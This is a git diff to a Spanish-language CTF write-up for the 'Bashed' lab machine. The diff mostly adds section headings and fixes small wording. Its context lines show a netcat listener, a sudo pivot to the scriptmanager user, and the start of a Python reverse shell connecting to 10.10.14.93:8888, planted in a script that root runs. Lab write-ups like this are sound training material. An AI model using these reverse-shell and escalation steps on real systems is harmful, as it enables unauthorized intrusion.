@@ -6,6 +6,8 @@ tags: [fuzzing, gobuster, pspy]
 image: /assets/img/cabeceras/2024-08-23-bashed---writeup.png
 ---
 
+## Enumeración
+
 NMAP
 
 ```bash
@@ -76,6 +78,9 @@ Si pulsamos en cualquiera de los dos abriremos una consola de ejecución local d
 
 ![image](/assets/img/2024-08-23-bashed---writeup/pasted-image-20240127211226.png)
 
+
+## Explotación
+
 Vamos a intentar mandarnos una reverse shell.
 
 Nos ponemos a la escucha por el puerto 4444 con _NetCat_
@@ -98,6 +103,8 @@ Hacemos un _sudo -l_ y vemos algo interesante...
 
 Podemos ejecutar comandos como el usuario _scriptmanager_ sin proporcionar contraseña.
 
+## Escalada
+
 Nos subimos _linpeas_ y _pspy_ y seguimos enumerando...
 
 ![image](/assets/img/2024-08-23-bashed---writeup/pasted-image-20240127220643.png)
@@ -108,7 +115,7 @@ Con _pspy_ descubrimos que root ejecuta un script en python que ejecuta todos lo
 
 Sospechosamente pertenece al usuario _scriptmanager_...
 
-Pero recordamos que tenemos el permiso de ejecutar tareas como ese usuario así que vamos a intentar espawnearnos una shell...
+Pero recordamos que tenemos el permiso de ejecutar tareas como ese usuario así que vamos a intentar enviarnos una shell...
 
 ```bash
 $ sudo -u scriptmanager bash -i
@@ -126,7 +133,7 @@ Creo que bastará con modificar el archivo .py existente.
 
 Lo abrimos y lo dejamos así:
 
-```Python
+```python
 import socket,subprocess,os 
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 s.connect(("10.10.14.93",8888))
